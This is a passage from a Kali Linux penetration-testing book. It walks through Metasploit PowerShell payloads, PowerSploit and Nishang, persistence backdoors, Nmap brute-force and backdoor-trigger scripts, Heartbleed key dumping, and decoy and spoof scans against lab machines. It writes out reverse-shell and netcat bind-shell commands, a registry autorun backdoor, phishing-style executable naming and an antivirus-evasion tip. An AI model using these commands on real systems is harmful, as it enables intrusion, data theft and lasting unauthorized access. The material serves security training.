“Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.” - [http://www.powershellempire.com/](http://www.powershellempire.com/)

The best defense against these types of attacks is to never open or run unexpected files or attachments in e-mails. Never use a USB drive that you find laying around your company. Avoid public Wi-Fi when possible. Always use a script blocking program on your internet browser. And lastly, network security monitoring is imperative for hopefully detecting and analyzing what was compromised if the worst should happen.

Resources

 Windows PowerShell 1.0: [https://technet.microsoft.com/en-us/library/hh848793.aspx](https://technet.microsoft.com/en-us/library/hh848793.aspx)

 Powershell Popups + Capture:

[http://www.room362.com/blog/2015/01/12/powershell-popups-plus-capture/](http://www.room362.com/blog/2015/01/12/powershell-popups-plus-capture/)

 1Invoke-TwitterBot - Copyright (c) 2013, Chris Campbell (@obscuresec):

[https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot](https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot)

[http://www.obscuresec.com/](http://www.obscuresec.com/)

 Windows credentials phishing using Metasploit:

[https://forsec.nl/2015/02/windows-credentials-phishing-using-metasploit/](https://forsec.nl/2015/02/windows-credentials-phishing-using-metasploit/)

## Chapter 12

## PowerShell Payloads, PowerSploit and Nishang

In this Chapter we will learn how to use the new Metasploit PowerShell Payloads with PowerSploit. We will also look at using Nishang - PowerShell for penetration testing tools.

New PowerShell Payloads

 Module Creators: Dave Hardy and Ben Turner

 Module Website: [https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/](https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/)

PowerSploit

 Project Creator: Matt Graeber

 Project Website: [https://github.com/mattifestation/PowerSploit](https://github.com/mattifestation/PowerSploit)

Introduction to PowerSploit

PowerSploit is a great collection of PowerShell scripts used for security testing. The beauty of PowerShell scripts running against a remote machine is that they usually never touch the disk (unless you download the actual scripts to the drive). Also PowerShell scripts inherently have a high level of Anti-Virus bypass capability as most run in windows service contexts, like the PowerShell service.

The scripts are available on the creator’s GitHub site, but also come pre-installed in Kali in the “/usr/share/powersploit” directory:

![](Images/image00629.jpeg)

Basically all you need to do is pull the script files down to a target machine initialize and run them. Some can also be used to target other remote systems. We will use PowerSploit scripts with Meterpreter’s new PowerShell Payloads.

### PowerShell Payload Modules Introduction

We covered how to run encrypted PowerShell commands through a Meterpreter DOS Shell in the previous chapter. The new PowerShell Payload Modules offer an extremely easy way to integrate PowerShell attacks into Metasploit.  

![](Images/image00493.jpeg)

Before these shells were released, whenever you entered a PowerShell session with a remote host through Meterpreter you would lose control of the shell and not see PowerShell commands echoed back to you. To bypass this you needed to take all of your PowerShell commands, encrypt them and pass them through the Meterpreter shell in a single command. But with these new Shells you can interact with PowerShell in real-time!

Let’s see how these work together by using the Metasploit’s “web delivery” exploit.

 Copy the “powersploit” directory to the “/var/www/html/”  directory:

![](Images/image00630.jpeg)

 Start Kali’s HTTP Server. In a Kali terminal type, “/etc/init.d/apache2 start”

 Start Metasploit and configure it to use the Web Delivery exploit and the Windows PowerShell_Reverse_TCP payload:

![](Images/image00631.jpeg)

 Run the Exploit:

![](Images/image00632.jpeg)

 Now copy the PowerShell command created by the exploit and run it in a Command Prompt box on your Windows system:

![](Images/image00633.jpeg)

And we have a session:

![](Images/image00634.jpeg)

 Type, “sessions” to view available sessions:

![](Images/image00635.jpeg)

Notice that the session type is “powershell”.

 Connect to the session, “sessions -i 1”:

![](Images/image00636.jpeg)

Now notice that we are not sitting at a regular Windows command prompt, but a Windows PowerShell prompt! We can now run any PowerShell commands directly on the remote system. The commands available will vary by which version operating system that you are connected to. Windows 8 has a couple interesting built in network commands that are not in Windows 7\. But as you will see in a moment, we can just pull down PowerShell scripts and pretty much do what we want. For now, let’s try a couple of the built in commands.

 Type, “Get-Process”:

![](Images/image00637.jpeg)

 View the System event log with “Get-Eventlog system”:

![](Images/image00638.jpeg)

 Type, “Get-Command” to see a list of available commands:

![](Images/image00639.jpeg)

Take some time and play around with the commands until you get comfortable with them. Next we will see how to download and use the PowerSploit Scripts.

### Using PowerSploit Scripts

In this section we will learn how to set the PowerShell payload to automatically download the scripts that come with PowerSploit when the session is created. We do so by setting the LOAD_MODULES variable in the payload with the location of the PowerShell script we want to use.

![](Images/image00640.jpeg)

1.  Go ahead and type “exit” to close the active shell.
2.  Enter, “set LOAD_MODULES [http://192.168.1.39/powersploit/Recon/Invoke-Portscan.ps1](http://192.168.1.39/powersploit/Recon/Invoke-Portscan.ps1)”
3.  Type “re-run” to run the exploit again using the new setting.
4.  Take the resultant PowerShell command and run it on the Windows 7 system and we should get a new session:

![](Images/image00641.jpeg)

5.  Connect to session 2:

![](Images/image00642.jpeg)

Notice that it now says “Loading modules” above the PowerShell prompt. The shell automatically downloaded the PowerShell script that we specified. Each Powersploit shell includes a description and usage examples in the file. Just view the files to see how they work. Here is one of the sample usages from the Invoke-Portscan.ps1 script:

![](Images/image00643.jpeg)

Now that the Invoke-Portscan.ps1 file was automatically downloaded for us by the module, we can simply run the command. Let’s do a simple portscan:

 Invoke-Portscan -Hosts 192.168.1.1 -T 4 -TopPorts 25 -oA localnet

![](Images/image00644.jpeg)

As you can see in the screenshot above, we successfully had our target Windows system port scan another device (a router in this instance) and return the results. This is one reason why attack attribution can be very difficult; in the real world the system that is scanning you might just be one that was hijacked by a hacker. The real hacker could be located in another country.

Take some time and try pulling down some of the other modules, you can pull just one at a time or multiple modules by separating them with a comma.

### Nishang - PowerShell for Penetration Testing

Tool Author: Nikhil SamratAshok Mittal

Tool Website:  [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Also included in the “/etc/share” directory is “Nishang - PowerShell for penetration testing and offensive security”:

![](Images/image00645.jpeg)

This is a very interesting collection of tools, and you can use many of them in the same way that we have already covered. We will just look at using the Get-Information script located at /usr/share/nishang/Gather/Get-Information.ps1.

Just as in the PowerSploit example, we will copy this file up to our Kali Apache Server directory, and then use the Metasploit PowerShell shell to pull it down to the victim machine. This module seems to work very well with Windows 7, so we will be using our Windows 7 VM as the target.

1.  Copy the Nishang directory to the webserver directory on Kali:

![](Images/image00646.jpeg)

2.  Start Metasploit and configure the Web Delivery exploit with the PowerShell payload:

![](Images/image00647.jpeg)

3.  Run the exploit:

![](Images/image00648.jpeg)

4.  Copy the resultant PowerShell command and run it in a Windows command prompt, and we get a remote session:

![](Images/image00649.jpeg)

We now have a remote PowerShell session to the Windows 7 box and as you can see it also downloaded the Get-Information module for us. Now all we need to do is run it.

5.  Type, “Get-Information”

The module returns a lot of information about the system, here is just a snippet:

PS C:\Users\Dan>Get-Information

Logged in users:

C:\Windows\system32\config\systemprofile

C:\Windows\ServiceProfiles\LocalService

C:\Windows\ServiceProfiles\NetworkService

C:\Users\Dan

Installed Applications:

7-Zip 9.20

Mozilla Firefox 39.0 (x86 en-US)

Mozilla Maintenance Service

XAMPP

Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148

VMware Tools

Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022

Account Policy:

Force user logoff how long after time expires?:  Never

Minimum password age (days):   0

Maximum password age (days):  Unlimited

Minimum password length:   0

Length of password history maintained:   None

Lockout threshold:  Never

Lockout duration (minutes):   30

Lockout observation window (minutes):   30

Computer role:  WORKSTATION

Nishang offers multiple PowerShell scripts to play with. I recommend taking some time and reading through the scripts to see which ones would work best for your needs.

### PowerShell Payload as a Direct Exploit

The last thing I want to cover is using the PowerShell Payload directly as an exploit. The Web Delivery service and hand copying the PowerShell code to the target server is great for learning, or if you have physical access to the target system, but not very practical in real life. In the Msfvenom chapter we saw how to turn the PowerShell Payload into a Windows Batch file, now let’s see how to turn the PowerShell payload into a direct executable.

 Simply Type, “msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.1.39 LPORT=4444 -f exe > evilPS.exe”

![](Images/image00650.jpeg)

Now that we have our “EvilPS.exe”, copy it over to the windows system and run it. In a real pentest we would call it something like “CutePuppies.exe” or “Expense-Report.exe” and send it as an attachment in a specially crafted E-mail.

Start a Metasploit reverse handler to catch the incoming session:

 use exploit/multi/handler

 set lhost 192.168.1.39

 set lport 4444

 set payload windows/powershell_reverse_tcp

 exploit

As soon as the “EvilPS.exe” file is run in Windows, we get a connection:

![](Images/image00651.jpeg)

How easy is that?

Conclusion

In this section we learned how to use Metasploit’s PowerShell payload to get an interactive PowerShell session with a remote Windows box. We also learned how to use some of the PowerShell exploits that come pre-installed with Kali and how to deliver them automatically on loading. Lastly, we learned how to turn the PowerShell payload into a standalone .exe exploit.

We only covered some basic features of using PowerShell scripts as exploits. These types of exploits are a huge issue for Windows security and system administrators as they can hide as legitimate scripts. Windows Defender is starting to block some of these exploit scripts, but I have heard that sometimes you just need to change the module filename or change the offending command name in the script and it bypasses Windows defender again.

My best device on defending against these scripts is to block incoming attachments when you can, enable Windows PowerShell auditing & logging and always instruct your users to never open unknown attachments when in e-mail or surfing the web. There are some interesting articles on Hacker Hurricane’s blog on defending against PowerShell attacks that are well worth reading ([http://hackerhurricane.blogspot.com/2015/05/defending-against-powershell-shells.html](http://hackerhurricane.blogspot.com/2015/05/defending-against-powershell-shells.html)).

## Chapter 13

## Maintaining Access

You were able to get a remote shell on a system, congratulations! Now you want to see what can be done to have persistence with the box. As an attacker, this means that we want to be able to connect back to the exploited box at a different time or date. Many people think that this would be just creating some sort of backdoor access. But it is not always about just creating a hidden shell. Persistence can mean multiple things. Basically persistence is doing whatever needs to be done to a target system that allows you to gain the access you want in the future.

This can include:

 Creating a new user

 Creating or providing access to a share

 Enabling a service (FTP, Wi-Fi)

 Modifying a user’s access

 Setting or changing permissions

 Creating back doors

Most of these are pretty self-explanatory, Meterpreter offers payloads that create users and enable services (Metasploit search is your friend), though many of these tasks can be done manually while you have access. So let’s take some time and look at the backdoor type persistence options that come with Metasploit. We will look at three Metasploit Persistent scripts:

 Persistence

 S4u Persistence

 VSS Persistence

And then look at some other options for creating backdoors.

### Meterpreter “Persistence” Script

One of the most common Meterpreter scripts used to maintain access after exploiting a system is the built in “Persistence” module. From an active Meterpreter session you simple run the Persistence command with the control switches that you want. The script installs a file that then tries to connect back to the attacker machine at set intervals.

Persistence needs to run from an elevated account and to maintain System level access (you may also want to migrate Meterpreter to a privileged service before running). To do this you will need to start with an active meterpreter session to a Windows 7 administrator account, which we will elevate to NT system level with the “bypassuac” module and then run the “getsystem” command:

Background the active administrator meterpreter session using the “background” command and then:

 use exploit/windows/local/bypassuac_injection

 set session 1

 set payload windows/meterpreter/reverse_tcp

 set lhost 192.168.1.39

 set lport 4545 (Important: use a different port from one used for original shell)

 exploit

![](Images/image00652.jpeg)

Now, type “getsystem” to elevate to NT System authority:

![](Images/image00653.jpeg)

We are now running as System, and will be able to run the Persistence command:

 Type, “run persistence -h” to see available options:

![](Images/image00654.jpeg)

Looking at our options, let’s create a persistence script that starts at computer startup (-X), tries to connect every 10 seconds (-i 10), runs on port 443 (-p 443), and connects out to our Kali system (-r 192.168.1.39). The command will look like this:

 run persistence -X -i 10 -p 443 -r 192.168.1.39

![](Images/image00655.jpeg)

And that is it! Notice on the screenshot above that it lists where the file is stored on the Windows machine, and it also gives you the location of a Meterpreter resource (.rc) file you can run to remove persistence.

We can now exit out of Metasploit completely (closing the active connection) back to the terminal prompt and then restart msfconsole. This will simulate coming back to the server at a later time. Also reboot the Windows 7 system and log back in.

Now all we need to do is start a handler for the persistence script and our target system should connect back to us (or you could just use the (-A) switch at runtime to have Metasploit do this for you automatically).

At the msf> prompt, type:

 use exploit/multi/handler

 set payload windows/meterpreter/reverse_tcp

 set LHOST 192.168.1.39

 set LPORT 443

 exploit

And we have a session:

![](Images/image00656.jpeg)

We can now get access back to the target system at any time we want by simply starting the handler service. One thing to keep in mind is the timing on the “-i” switch. During a pentest you don’t want this value set too low so the target tries constantly to connect out to your system. This could get picked up more readily as suspicious traffic.   

Removing Persistence

Directions for removing the persistence script are included when you run the script. You can see the script set to run automatically on your Windows 7 system by running “msconfig” in a Windows Prompt:

![](Images/image00657.jpeg)

You can manually remove the .vbs file and disable the command. Or just manually run the uninstall persistence script:

![](Images/image00658.jpeg)

And it is gone:

![](Images/image00659.jpeg)

### S4u_persistence - Scheduled Persistence

Creators: Thomas McCarthy & Brandon McCann

![](Images/image00660.jpeg)

S4u_Persistence is an amazing backdoor option. It runs as a scheduled task that can also be tagged to certain system events like logon, logoff, workstation lock, etc. This adds a whole new level of intelligence to our backdoor attempts.

The available options are:

![](Images/image00661.jpeg)

So let’s create one that will trigger on a workstation lock. This requires an active session and a payload, so background an existing Metasploit session and then enter the following:

![](Images/image00662.jpeg)

And that is it! Again notice that removal instructions are included. Exit out of Metasploit and restart it, simulating coming back at a later time. Now start a handler for the payload you selected:

![](Images/image00663.jpeg)

On the Windows 7 system, lock the workstation (“Windows” and “L” Key). This simulates a user locking his workstation as he goes to lunch like all good security conscious corporate users would. As soon as it is locked, we get a remote shell:

![](Images/image00664.jpeg)

As you can see this type of exploit can be very handy. You can tag it to any system event, allowing almost unlimited capabilities for the opportunistic minded pentester. Don’t forget to remove the scheduled task when done. I highly recommend that the reader spend some time and play with the different ways of using this impressive module.

### Vss_Persistence - Volume Shadow Copy Persistence

Creator: Jedediah Rodriguez

![](Images/image00665.jpeg)

VSS_Persistence creates a persistent backdoor capability via Volume Shadow copy. This exploit needs to run from an elevated account:

![](Images/image00666.jpeg)

At the time of this writing there is a reported issue with this module running as the user System and it is being investigated.     

### Netcat Backdoor

Metasploit includes windows executables that you can use, located in the “/usr/shar/windows-binaries” directory:

![](Images/image00667.jpeg)

We can use the Windows Netcat (nc.exe) as a backdoor by uploading it to the Windows 7 system and having it run automatically. As with the previous example, we need to be running from an elevated session:

![](Images/image00668.jpeg)

 upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32\\

![](Images/image00669.jpeg)

Add it to the registry:

 reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d "c:\\windows\\system32\\nc.exe -ldp 5555 -e cmd.exe"

Then you can check to make sure that it took correctly:

 reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat

![](Images/image00670.jpeg)

We can also run “msconfig.exe” in Windows to verify that it was created successfully:

![](Images/image00671.jpeg)

Now you just need to reboot the windows system and then connect to the Windows Netcat program using the nc program in Kali:

 nc -nv <Target IP Address> <port>

![](Images/image00672.jpeg)

We can also connect to the Windows Netcat program by starting a handler in Metasploit (you may need to restart Windows again to reset Netcat):

 back

 use exploit/multi/handler

 set payload windows/shell_bind_tcp

 set RHOST <Target IP Address>

 set LPORT <Port>

 exploit

![](Images/image00673.jpeg)

### Enabling Remote Desktop

Another thing we can do is enable Remote Desktop in Windows through Metasploit. This works much better in Windows XP than in Windows 7\. If your victim is a Windows 7 system I recommend using one of the other techniques above. But let’s run through it anyways.

From an elevated Meterpreter prompt, type “run getgui -h” to see the help file.

You just need to set a username and a password for the remote user:

 run getgui -u EvilUser -p P@$$w0rd

![](Images/image00674.jpeg)

Remote desktop is started and our evil user is added as a remote desktop user. To connect to the remote desktop session:

 Open a terminal on your Kali system

 Type, “rdesktop -u EvilUser -p P@$$w0rd <Target IP Address>”

In Windows XP you should connect and be all set, in Windows 7 you will get an “unable to connect” error message. To connect in Windows 7, remote Desktop needs to be set to “allow connections from computers running any version of Remote Desktop” as seen below:

![](Images/image00675.jpeg)

If that is enabled, you will get a Windows 7 desktop on your Kali system:

![](Images/image00676.jpeg)

The problem is, on Windows 7 if someone is already logged on, they will get this message:

![](Images/image00677.jpeg)

Again, this is not the best option in Windows 7, but it does work.

Maintaining Access on a Webserver

As we covered in the Msfvenom chapter, we can use Meterpreter’s PHP shell to maintain access on a webserver.

1.  Create a PHP file using msfvenom by typing, “msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.39 LPORT=4444 raw > evilphp.php”

![](Images/image00678.jpeg)

For the payload we chose the PHP based Meterpreter reverse shell. We set the IP address of the Kali system, the port we want to use and set the output as raw. This creates our PHP shellcode file. But when the file is created the necessary “<?php” tag at the beginning is commented out and the ending “?>” is missing. We will have to fix these tags manually to get it to work correctly.

2.  Open the shellcode file in a text editor and modify the tags as seen below:

![](Images/image00679.jpeg)

3.  Now copy the evil PHP file to our vulnerable website (We will go over this in detail in the Web Pentesting chapter).
4.  Start the handler service:

![](Images/image00680.jpeg)

5.  Browse to the vulnerable website and execute the PHP command from the browser in Kali:

![](Images/image00681.jpeg)

6.  And we get a shell:

![](Images/image00682.jpeg)

Other Options

Here are some additional options for Persistence:

Meterpreter Service - The Metasploit Service or “Metsvc” is a commonly used backdoor option for Windows. But for some reason at the time of this writing it did not seem to be working in Kali 2 against a Windows 7 host. It will probably still work against Windows XP.

![](Images/image00683.jpeg)

VNCInject - Though not a true persistence option, controlling a remote windows host via VNC is always fun. But again for some reason at the time of this writing the VNC payload and injection modules did not seem to be working with Windows 7.

![](Images/image00684.jpeg)

Create your own - Don’t forget that you could always create your own shell file with msfvenom and set it to auto load on windows. I leave that as a challenge exercise for the reader to try if they wish. As a hint we pretty much already did this earlier in this section.

The Future

Another exciting feature that is still a work in progress is the new “Transport” Metasploit feature. Though not technically for persistence, “transports” are a new feature in Metasploit that adds resilience to connections. Transports allow you to set up multiple payloads of different types. Once these are set you can change from one to another at command. Also, if the connection to one payload fails, it will automatically roll over to the next payload ensuring uninterrupted connectivity.

Basically you set a payload as a transport using the “add” switch, and then add additional ones as needed. You can then move from transport to transport with the “transport next” and “transport prev” commands. Transports are added from a live meterpreter session.

The available payloads are:

 bind_tcp

 reverse_tcp

 reverse_http

 reverse_https

![](Images/image00685.jpeg)

Keep an eye on this feature, when it is complete it should be extremely useful. For more information check out the Transport Control Wiki at:

[https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control)

Conclusion

In this section we covered multiple ways to create persistent backdoors using the tools in Kali 2\. As mentioned earlier, many times you just want to add a user or a service which is somewhat trivial. But if you need to create a backdoor, Kali offers you multiple options to create exactly what you need. 

Resources

 Scheduled Persistence -[https://www.pentestgeek.com/penetration-testing/scheduled-tasks-with-s4u-and-on-demand-persistence/](https://www.pentestgeek.com/penetration-testing/scheduled-tasks-with-s4u-and-on-demand-persistence/)

# Scanning

## Chapter 14

## Nmap

In my previous book we briefly saw how to use nmap to scan a system for open ports and perform software version identification. Nmap is an indispensable tool, not only can you scan for ports and system version info, but you can also detect vulnerabilities. So in this section I want to take a closer look at Nmap and its available functions.

For this tutorial we will use the Metasploitable VM (IP: 192.168.1.68) as a target.

Tool Author: Gordon Lyon

Tool Website:  [http://nmap.org/](http://nmap.org/)

Manual Page:  [http://nmap.org/book/man.html](http://nmap.org/book/man.html)

![](Images/image00686.jpeg)

Basic Scans

Let’s look at some basic scans. You can use the “-v” & “-vv” verbose switches can be used as needed to increase verbosity for nmap scan returns.

 Quick port scan:  nmap [Target IP]

This very quick scan checks to see if the server is up and then displays open ports:

![](Images/image00687.jpeg)

 Fast Scan (-F):  nmap -F [Target IP]

This scan is even faster than the quick scan. It checks to see if the host is up and checks for fewer open ports:

![](Images/image00688.jpeg)

The Metasploitable VM has a lot of ports open, giving multiple avenues of attack. But just knowing that ports are open is not enough. Nmap will scan the ports and try to determine what service type and version is running. Once we have specific service information, we can look for possible vulnerabilities.

 Software Detection (-A): nmap -A [Target IP]

This scan can take a while to run, but detects and displays OS & Software version:

![](Images/image00689.jpeg)

Now let’s run the command again, this time with the “-v” (verbose) and then again with the “-vv” (very verbose) switches set to see the differences. Compare the two images below with the one above:

![](Images/image00690.jpeg)

Notice that increasing levels of information is added as you progress from not using the switch through using the “-vv” switch.

Scanning Specific Ports

Nmap also allows you to refine your scans to specific ports or protocols. I know that some pentesters don’t even bother to use Nmap anymore - they just target the Database server or try phishing attempts. But if you wanted you could just scan a specific port, or ports on a server. 

 Port Scan (-p): nmap [Target IP] -p 21

This scans a certain port:

![](Images/image00691.jpeg)

 Multiple Ports:  nmap [Target IP] -p 21,25,80):

![](Images/image00692.jpeg)

 Scan Top TCP Ports: nmap [IP Address] --top-ports <number>

This scans the top ports for the number of ports that you specify. So if you use “--top-ports 10” it will scan the top 10 TCP ports:

![](Images/image00693.jpeg)

 Scan UDP ports (-sU): nmap -sU [Target IP] -p 53

Use this switch to scan UDP ports:

![](Images/image00694.jpeg)

You can also use the “-A” (service detection) and “-v” (verbose) switch along with the specified ports. Combining these can be very helpful to detect and display important information only on ports that you want.

 nmap -A -v 192.168.1.68 -p 21,25,80

![](Images/image00695.jpeg)

Take a close look at the services detected and their software versions. As I demonstrated in my first book, scanning ports and finding out which services are running and what version of these services are present is key to exploiting a system. At the simplest level, find the service software version and search for exploits. You can use Metasploit for a lot of the vulnerabilities in the Metasploitable VM, but you can also use Nmap scripts to find, and sometimes exploit these vulnerabilities.

### Using Nmap with Scripts

There are numerous scripts you can use with nmap to modify it from a scanner to a complex testing tool and offensive platform. A list of scripts is available on the nmap page:

[https://nmap.org/nsedoc/index.html](https://nmap.org/nsedoc/index.html)

Let’s take a look at a few of these in detail. To see which scripts you have installed check out the ‘/usr/share/nmap/scripts’ directory. Something to note is that if the script doesn’t work, the target may not be vulnerable, or you might not have all the required files installed that are listed on the individual script’s webpage.

FTP Brute Force Attack

First up, the FTP Brute Force script:

 nmap --script ftp-brute -p 21 192.168.1.68

To see this at work, while it is running, open Wireshark and capture traffic on eth0. You should see something like the following:

![](Images/image00696.jpeg)

But what is nmap really doing? Let’s find out. Select one of the TCP packets sent from your Kali system to the Mutillidae VM. Right click on it and click “follow TCP Stream”. You should see something like this:

220 (vsFTPd 2.3.4)
USER webadmin

PASS matthew

[34 bytes missing in capture file]530 Login incorrect.

Nmap is attempting to log in to the FTP server by cycling through a list of username and passwords! After a short time you should see this:

![](Images/image00697.jpeg)

Nmap was able to login with the username and password of “user”. To verify this, open up a terminal and type, “telnet -l user 192.168.1.68”. The “-l” switch provides the username, so you will just be prompted for the password. Enter “user” and you will log in:

![](Images/image00698.jpeg)

Scan for Exploited Services

When a network is compromised, a hacker will attempt to create a backdoor for themselves. And on the rare occasion, a backdoor is actually found in legitimate software. Using Nmap we can scan for one such instance of this using the “irc-unrealircd-backdoor” scanner. Metasploitable is using the Unreal IRC service on port 6667, I wonder if it could be vulnerable?

Go ahead and run:

 nmap -p 6667 --script=irc-unrealircd-backdoor 192.168.1.68

Nmap will churn for a few seconds and then reveal:

6667/tcp open  irc         Unreal ircd

|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277

Looks like the Unreal IRC installed in Metasploitable is vulnerable, surprising I know! Let’s exploit this using Netcat and Nmap. According to the nmap command info page, we can send commands to this script using the “--script-args=irc-unrealircd-backdoor.command=” switch. With this command we can tell the Trojan present on the machine to start Netcat in listener mode:

 nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -l -p 4444 -e /bin/sh' 192.168.1.68

You will get some errors when it runs, but just ignore them. This command triggers the secret backdoor, telling the system to start Netcat and listen for our connection attempt on port 4444\. So all we need to do is start Netcat and point to that port:

 netcat 192.168.1.68 4444

And we will receive a remote shell. There will be no prompt, just go ahead and type commands:

![](Images/image00699.jpeg)

Next we will take a look at how to scan for and exploit the “Heartbleed” bug.

### OpenSSL-Heartbleed - Scanning and Exploiting

Last year the “OpenSSL-Heartbleed” vulnerability caused quite a commotion. Unbelievably, a full year later, a large percentage of public facing servers have never been fully remediated:

[https://www.venafi.com/blog/post/still-bleeding-one-year-laterheartbleed-2015-research/](https://www.venafi.com/blog/post/still-bleeding-one-year-laterheartbleed-2015-research/)

Let’s take a look at scanning for a vulnerable system using nmap and exploit it using Metasploit. For a vulnerable server, I used an outdated Wordpress VM that I had laying around. So unless you happen to have an old WordPress VM lying around, this will be more of a read through than an actual walk through. But the technique is sound and will help you at least learn how to scan for the vulnerability.

Nmap has a Heartbleed script that does a great job of detecting vulnerable servers. By now, the script should be available in your version of Kali, (/usr/share/nmap/scripts/ssl-heartbleed.nse) if so, skip ahead to “Scanning for Heartbleed”, if not, update Kali or manually install it.

Manually installing Scripts

This is pretty easy, just visit the [OpenSSL-Heartbleed nmap Script page](http://nmap.org/nsedoc/scripts/ssl-heartbleed.html), copy and save the [nmap nse script file](https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse) to your nmap “scripts” directory as seen below:

[![Heartbleed nmap script save](Images/image00700.jpeg)](https://cyberarms.files.wordpress.com/2014/04/heartbleed-nmap-script-save.png)

You will also need the [nmap “tls.lua” library file](http://nmap.org/nsedoc/lib/tls.html), save this to the nmap “nselib” directory as seen below:

[![Heartbleed nmap tls library](Images/image00701.jpeg)](https://cyberarms.files.wordpress.com/2014/04/heartbleed-nmap-tls-library.png)

That is it; we can now use the heartbleed script in nmap to detect vulnerable systems.

Scanning for Heartbleed

Command: nmap -p 443 --script ssl-heartbleed [IP Address]

All we need to do is use the Heartbleed script and add in the IP address of our target site, 192.168.1.71 in this instance. And if the target machine is vulnerable we will see this:

![](Images/image00702.jpeg)

State: VULNERABLE
Risk Factor: High

Exploiting with Metasploit

Now that we know we have a vulnerable server, we can use the Metasploit OpenSSL-Heartbleed module to exploit it. (Note: you can use this module to detect vulnerable systems also.)

 Run “msfconsole” in a terminal to start Metasploit

 Next search for the Heartbleed modules:

[![heartbleed search](Images/image00703.jpeg)](https://cyberarms.files.wordpress.com/2014/04/heartbleed-search.png)

Notice there are two, we will just be using the scanner.

 Type, “use auxiliary/scanner/ssl/openssl_heartbleed”:

[![heartbleed metasploit module](Images/image00704.jpeg)](https://cyberarms.files.wordpress.com/2014/04/heartbleed-metasploit-module.png)

We have three actions that we can take with this module. We can “Scan” for the vulnerability, “Dump” memory from the system or try to recover the RSA Private ‘Key’. First we will see if we can recover the Private Key from the target.

 First type, “set rhosts 192.168.1.71”

 Then, “set action KEYS”

 And finally, “exploit”:

![](Images/image00705.jpeg)

Within a few seconds, it recovers the Private Key! We can also try to grab random memory from a remote system using the ‘Dump’ action.

 Type, “set action DUMP”

 And then, “exploit”

![](Images/image00706.jpeg)

Notice the data recovered is stored in the “/root/.msf4/loot” directory:

![](Images/image00707.jpeg)

If we view the bin file with the Linux “strings” command you will see that Metasploit communicated with the server and was able to pull random data from the server’s memory:

![](Images/image00708.jpeg)

The important thing to note here is that it pulls random data from memory. There is no guarantee that you will find account credentials, session cookie data or critical data every time you run this. But the danger is in the fact that it could  display sensitive data.

### IDS Evasion and Advanced Scans

Before we wrap this section up, let’s take a quick look at Nmap’s IDS evasion and advance scanning options. Nmap scans can be modified in an attempt to bypass Intrusion Detection Systems or mask the attacker. We will analyze a couple of these with Wireshark to see the difference.

For each of these, simply start Wireshark (Type, “Wireshark”, select interface Eth0, and click, “Start Scan”) and let it run while you run the individual Nmap commands, then compare the results between the scans.

Baseline - A Regular Scan

Command:  nmap 192.168.1.68

![](Images/image00709.jpeg)

As you can see the results are very methodical. The scan generates a lot of sequential back and forth traffic. This stands out like a sore thumb to IDS and other network monitoring systems. Notice too how the traffic is directly between our Kali & Target system. Anyone could see quickly where the scan had originated.

Fragmented Scan

Command:  nmap -f 192.168.1.68

![](Images/image00710.jpeg)

With the fragmented scan, nmap sends multiple fragmented packets in an attempt to bypass IDS detection. The fragments are re-assembled and then the target system responds. Notice the scan is still somewhat sequential and the source of the scan is very obvious.

Decoy Scan

Command:  nmap 192.168.1.68 -D 192.168.1.20,10.0.0.34,192.168.1.168,10.0.0.29

![](Images/image00711.jpeg)

The Decoy scan is where things begin to get interesting. This scan allows you to enter a string of fake IP addresses to use as attacking addresses. As you can see in the Wireshark output above it looks like 5 different sources are scanning the target system instead of just one. And according to Nmap, some common port scanners will only track and show up to 6 scanners at once, so if you use more decoys your true IP may not even show up!

Spoof Scan

Command:  nmap 192.168.1.68 -S 192.168.1.168 -e eth0

![](Images/image00712.jpeg)

Spoof scans are interesting. You scan a target while spoofing the scanners address making it look like someone else is performing the attack. You most likely will not get a useable response back (or a response at all) but this could be useful if someone is trying to make it look like a different company or even country is scanning them - Can anyone say “attribution”? 

![](Images/image00713.jpeg).

Conclusion

In this chapter we looked at using nmap to perform basic system scanning. We also learned how nmap capabilities could be greatly expanded using nmap scripts. We did not cover every feature of nmap, like ARP scans, Ping sweeps, Christmas tree scans, or timing attacks, nor did we look at every script. But this information can be found in the help file and the online manual. The provided help information is pretty straightforward and I would recommend taking some time and playing with them so you become very familiar with the capabilities of nmap.

If you want to learn more about scanning networks using tools like nmap, I highly recommend the book, “Kali Linux Network Scanning Cookbook” by Justin Hutchens. It is hands down one of the best and most thorough books on scanning that I have ever seen.

## Chapter 15

## OWASP ZAP

OWASP Zed Attack Proxy (ZAP) or ZaProxy is a Web Application scanning and testing tool that can be used by both security professionals and developers. You can do a lot with ZAP; we will just be covering some of the more common features for security testing. You can start OWASP ZAP from the Web Application Proxy menu or from the command prompt, ‘zaproxy’.

![](Images/image00714.jpeg)

When you start the program you are asked if you want to “persist the ZAP Session”. This will store the active session so you can come back to it later. For now, just select “no, I do not want to persist this session at this moment in time” and click, “start”:

![](Images/image00715.jpeg)

You are then presented with the main interface. As you can see the screen is divided into three different sections – a Sites window on the top left, a quick start/request/response Window top right and a message box at the bottom.

Quick Scan & Attack

To get into the action quickly simply enter the address of your target (the Metasploitable 2 system) in the “URL to attack” input box and click the “Attack” button.

![](Images/image00716.jpeg)

This will spider the entire target website and scan it for vulnerabilities. The scan progress and pages found will be displayed in the bottom window. When it is finished press “Alerts” to see any security issues with the website:

![](Images/image00717.jpeg)

